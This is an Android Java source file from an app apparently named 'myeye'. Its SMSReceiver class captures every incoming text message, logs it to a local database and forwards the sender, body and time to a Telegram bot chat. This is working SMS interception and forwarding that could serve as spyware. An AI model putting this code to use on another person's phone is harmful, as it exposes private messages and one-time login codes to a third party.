package com.ahamedrahim.myeye;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSReceiver extends BroadcastReceiver {
    
    private DatabaseHelper databaseHelper;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            return;
        }
        
        databaseHelper = new DatabaseHelper(context);
        
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String message = smsMessage.getMessageBody();
                    long timestamp = smsMessage.getTimestampMillis();
                    
                    // Format timestamp
                    SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
                    String time = sdf.format(new Date(timestamp));
                    
                    // Save to database
                    String smsData = "Sender: " + sender + "\nMessage: " + message + "\nTime: " + time;
                    databaseHelper.saveSMSLog(smsData);
                    
                    // Send to Telegram
                    sendToTelegram(context, "📱 নতুন এসএমএস\n" + smsData);
                    
                    // Show notification
                    showNotification(context, "নতুন এসএমএস", "From: " + sender);
                }
            }
        }
    }
    
    private void sendToTelegram(Context context, String message) {
        TelegramBotManager botManager = new TelegramBotManager(context);
        
        // Get bot token and chat ID from database
        String botToken = databaseHelper.getSetting("bot_token");
        String chatId = databaseHelper.getSetting("chat_id");
        
        if (botToken != null && !botToken.isEmpty() && 
            chatId != null && !chatId.isEmpty()) {
            botManager.sendMessage(botToken, chatId, message);
        }
    }
    
    private void showNotification(Context context, String title, String message) {
        Toast.makeText(context, title + ": " + message, Toast.LENGTH_SHORT).show();
    }
                      }
